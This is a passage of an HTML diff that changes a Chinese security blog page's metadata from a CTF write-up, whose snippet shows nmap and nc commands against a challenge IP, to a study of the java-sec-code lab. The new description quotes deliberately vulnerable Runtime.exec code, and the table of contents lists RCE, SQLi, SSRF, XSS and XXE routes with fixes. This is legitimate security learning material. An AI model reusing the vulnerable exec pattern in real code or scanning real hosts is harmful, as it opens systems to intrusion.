@@ -6,52 +6,60 @@
   <meta name="keywords" content=" Java安全 ">
   <meta name="description" content="java-sec-code靶场学习 | 甜筒园">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="CITS1003 CTF[TOC] Emu Hack #1 - Backdoored根据题目描述，在端口61000到61500之间存在一个后门，使用nmap工具进行端口扫描: nmap 34.116.68.59 -p 61000-61550   发现在端口61337存在TCP服务，按照题目要求使用nc连接后发送EMU拿到flag nc 34.116.68.59 61337 EMU   Caffei">
+<meta name="description" content="[TOC] 一、RCE1.路由&#x2F;rce&#x2F;runtime&#x2F;exec漏洞代码： @GetMapping(&quot;&#x2F;runtime&#x2F;exec&quot;)     public String CommandExec(String cmd) &amp;#123;         Runtime run &#x3D; Runtime.getRuntime();         StringB">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CITS1003 CTF wp">
-<meta property="og:url" content="https://www.ttycp3.top/archives/f8a3bab8.html">
+<meta property="og:title" content="java-sec-code靶场学习">
+<meta property="og:url" content="https://www.ttycp3.top/archives/218e91a9.html">
 <meta property="og:site_name" content="甜筒园">
-<meta property="og:description" content="CITS1003 CTF[TOC] Emu Hack #1 - Backdoored根据题目描述，在端口61000到61500之间存在一个后门，使用nmap工具进行端口扫描: nmap 34.116.68.59 -p 61000-61550   发现在端口61337存在TCP服务，按照题目要求使用nc连接后发送EMU拿到flag nc 34.116.68.59 61337 EMU   Caffei">
+<meta property="og:description" content="[TOC] 一、RCE1.路由&#x2F;rce&#x2F;runtime&#x2F;exec漏洞代码： @GetMapping(&quot;&#x2F;runtime&#x2F;exec&quot;)     public String CommandExec(String cmd) &amp;#123;         Runtime run &#x3D; Runtime.getRuntime();         StringB">
 <meta property="og:locale">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427185925654.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427190418683.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427194602383.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427194758409.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427195103342.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427200212033.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427200237861.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205355895.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205446268.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205546918.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205715007.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205814892.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205854735.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427210020443.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427210136578.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427215222685.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427230728660.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427230941388.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427232027952.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428085406716.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428085508241.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428084447502.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428143720534.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428103936811.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428104023953.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428104245922.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428142339778.png">
-<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428142823544.png">
-<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514145356203.png">
-<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514145439171.png">
-<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514151957982.png">
-<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514152042484.png">
-<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514171059762.png">
-<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514173309181.png">
-<meta property="article:published_time" content="2024-05-09T08:21:59.504Z">
-<meta property="article:modified_time" content="2024-05-14T09:33:11.466Z">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927145407277.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927151028420.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927152514570.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927162828252.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927163939476.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927165141332.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927170714658.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927171602990.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927172317279.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927174250625.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930110431275.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930115111649.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930143648191.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930145400529.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930160113322.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930161505278.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930162139227.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930162620184.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930165613203.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930142358450.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008104016372.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008104436572.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008104751040.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008104854995.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008110604490.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008110623158.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008105859368.png">
+<meta property="og:image" content="c:\Users\ttycp3\AppData\Roaming\Typora\typora-user-images\image-20241008105829498.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008142315473.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009104055332.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009110131500.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009110238586.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008144233099.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008144612745.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008145950138.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008155935546.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008163207205.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008163241485.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008181225763.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009100727504.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009102136299.png">
+<meta property="article:published_time" content="2024-09-30T08:59:59.124Z">
+<meta property="article:modified_time" content="2024-10-09T03:35:23.923Z">
 <meta property="article:author" content="ttycp3">
+<meta property="article:tag" content="Java安全">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427185925654.png">
+<meta name="twitter:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927145407277.png">
 
 
 <link rel="icon" href="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/logo.png">
@@ -226,7 +234,7 @@
     </div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="33">
-<input type="hidden" id="yelog_site_word_count" value="46.2k">
+<input type="hidden" id="yelog_site_word_count" value="52.2k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -688,12 +696,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2024-09-30 17:04:43'>2024-09-30 16:59</time>
+            Created At : <time class="date" title='Updated At: 2024-10-09 11:35:23'>2024-09-30 16:59</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:5.5k</span>
+        <span>Count:11.6k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -723,7 +731,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81RCE"><span class="toc-text">一、RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-runtime-x2F-exec"><span class="toc-text">1.路由&#x2F;rce&#x2F;runtime&#x2F;exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-ProcessBuilder"><span class="toc-text">2.路由&#x2F;rce&#x2F;ProcessBuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-jscmd"><span class="toc-text">3.路由&#x2F;rce&#x2F;jscmd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-vuln-x2F-yarm"><span class="toc-text">4.路由&#x2F;rce&#x2F;vuln&#x2F;yarm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-groovy"><span class="toc-text">5.路由&#x2F;rce&#x2F;groovy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">二、SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-jdbc-x2F-vuln"><span class="toc-text">1.路由&#x2F;sqli&#x2F;jdbc&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-jdbc-x2F-ps-x2F-vuln"><span class="toc-text">2.路由&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-mybatis-x2F-vuln01"><span class="toc-text">3.路由&#x2F;sqli&#x2F;mybatis&#x2F;vuln01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-mybatis-x2F-vuln02"><span class="toc-text">3.路由&#x2F;sqli&#x2F;mybatis&#x2F;vuln02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-mybatis-x2F-orderby-x2F-vuln03"><span class="toc-text">4.路由&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-text">sql注入修复与防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-text">（1）预编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89waf"><span class="toc-text">（2）waf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89MyBatis%E9%98%B2%E6%8A%A4"><span class="toc-text">（3）MyBatis防护</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81SSTI"><span class="toc-text">三、SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-ssti-x2F-velocity"><span class="toc-text">1.路由&#x2F;ssti&#x2F;velocity</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SSRF"><span class="toc-text">四、SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-urlConnection-x2F-vuln"><span class="toc-text">1.路由&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-HttpURLConnection-x2F-vuln"><span class="toc-text">2.路由&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-openStream"><span class="toc-text">3.路由&#x2F;ssrf&#x2F;openStream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-HttpSyncClients-x2F-vuln"><span class="toc-text">4.路由&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-restTemplate-x2F-vuln1"><span class="toc-text">5.路由&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-restTemplate-x2F-vuln2"><span class="toc-text">6.路由&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-hutool-x2F-vuln"><span class="toc-text">7.路由&#x2F;ssrf&#x2F;hutool&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-denrebind-x2F-vuln"><span class="toc-text">8.路由&#x2F;ssrf&#x2F;denrebind&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-text">SSRF修复与防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%99%90%E5%88%B6%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8"><span class="toc-text">（1）限制协议使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B"><span class="toc-text">（2）限制文件类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89http%E8%AF%B7%E6%B1%82%E6%A3%80%E6%9F%A5"><span class="toc-text">（3）http请求检查</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A"><span class="toc-text">方法1：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A"><span class="toc-text">方法2：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A"><span class="toc-text">方法3：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%954%EF%BC%9A"><span class="toc-text">方法4：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%955%EF%BC%9A"><span class="toc-text">方法5：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E6%A0%B8%E5%BF%83SSRF%E9%98%B2%E6%8A%A4%E4%BB%A3%E7%A0%81"><span class="toc-text">（4）核心SSRF防护代码</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81RCE"><span class="toc-text">一、RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-runtime-x2F-exec"><span class="toc-text">1.路由&#x2F;rce&#x2F;runtime&#x2F;exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-ProcessBuilder"><span class="toc-text">2.路由&#x2F;rce&#x2F;ProcessBuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-jscmd"><span class="toc-text">3.路由&#x2F;rce&#x2F;jscmd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-vuln-x2F-yarm"><span class="toc-text">4.路由&#x2F;rce&#x2F;vuln&#x2F;yarm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-groovy"><span class="toc-text">5.路由&#x2F;rce&#x2F;groovy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">二、SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-jdbc-x2F-vuln"><span class="toc-text">1.路由&#x2F;sqli&#x2F;jdbc&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-jdbc-x2F-ps-x2F-vuln"><span class="toc-text">2.路由&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-mybatis-x2F-vuln01"><span class="toc-text">3.路由&#x2F;sqli&#x2F;mybatis&#x2F;vuln01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-mybatis-x2F-vuln02"><span class="toc-text">3.路由&#x2F;sqli&#x2F;mybatis&#x2F;vuln02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-mybatis-x2F-orderby-x2F-vuln03"><span class="toc-text">4.路由&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-text">sql注入修复与防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-text">（1）预编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89waf"><span class="toc-text">（2）waf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89MyBatis%E9%98%B2%E6%8A%A4"><span class="toc-text">（3）MyBatis防护</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81SSTI"><span class="toc-text">三、SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-ssti-x2F-velocity"><span class="toc-text">1.路由&#x2F;ssti&#x2F;velocity</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SSRF"><span class="toc-text">四、SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-urlConnection-x2F-vuln"><span class="toc-text">1.路由&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-HttpURLConnection-x2F-vuln"><span class="toc-text">2.路由&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-openStream"><span class="toc-text">3.路由&#x2F;ssrf&#x2F;openStream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-HttpSyncClients-x2F-vuln"><span class="toc-text">4.路由&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-restTemplate-x2F-vuln1"><span class="toc-text">5.路由&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-restTemplate-x2F-vuln2"><span class="toc-text">6.路由&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-hutool-x2F-vuln"><span class="toc-text">7.路由&#x2F;ssrf&#x2F;hutool&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-denrebind-x2F-vuln"><span class="toc-text">8.路由&#x2F;ssrf&#x2F;denrebind&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-text">SSRF修复与防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%99%90%E5%88%B6%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8"><span class="toc-text">（1）限制协议使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B"><span class="toc-text">（2）限制文件类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89http%E8%AF%B7%E6%B1%82%E6%A3%80%E6%9F%A5"><span class="toc-text">（3）http请求检查</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A"><span class="toc-text">方法1：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A"><span class="toc-text">方法2：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A"><span class="toc-text">方法3：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%954%EF%BC%9A"><span class="toc-text">方法4：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%955%EF%BC%9A"><span class="toc-text">方法5：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E6%A0%B8%E5%BF%83SSRF%E9%98%B2%E6%8A%A4%E4%BB%A3%E7%A0%81"><span class="toc-text">（4）核心SSRF防护代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81CSRF"><span class="toc-text">五、CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-csrf-x2F-post"><span class="toc-text">1.路由&#x2F;csrf&#x2F;post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF%E9%98%B2%E6%8A%A4"><span class="toc-text">CSRF防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81XSS"><span class="toc-text">六、XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-xss-x2F-reflect"><span class="toc-text">1.路由&#x2F;xss&#x2F;reflect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-xss-x2F-stored"><span class="toc-text">2.路由&#x2F;xss&#x2F;stored</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E9%98%B2%E6%8A%A4"><span class="toc-text">XSS攻击防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81XXE"><span class="toc-text">七、XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-xmlReader-x2F-vuln"><span class="toc-text">1.路由&#x2F;xxe&#x2F;xmlReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-SAXBuilder-x2F-vuln"><span class="toc-text">2.路由&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-SAXReader-x2F-vuln"><span class="toc-text">3.路由&#x2F;xxe&#x2F;SAXReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-SAXParser-x2F-vuln"><span class="toc-text">4.路由&#x2F;xxe&#x2F;SAXParser&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-Digester-x2F-vuln"><span class="toc-text">5.路由&#x2F;xxe&#x2F;Digester&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-DocumentBuilder-x2F-vuln"><span class="toc-text">6.路由&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-DocumentBuilder-x2F-xinclude-x2F-vuln"><span class="toc-text">7.路由&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln</span></a></li><li class="toc-item 